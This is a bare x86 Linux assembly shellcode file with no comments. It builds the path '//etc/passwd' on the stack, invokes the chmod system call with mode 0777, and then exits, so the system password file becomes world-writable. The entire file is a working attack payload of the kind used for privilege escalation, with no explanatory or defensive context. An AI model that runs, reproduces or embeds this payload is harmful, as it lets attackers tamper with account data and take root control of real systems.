section .text

global _start

_start:

	xor eax,eax
	push eax
	push 0x64777373
	push 0x61702f63
	push 0x74652f2f
	mov ebx,esp

	xor ecx,ecx
	mov cx,0x1ff
	
	push 1
	mov al,0xf
	int 80h

	pop eax
	xor ebx,ebx
	int 80h	
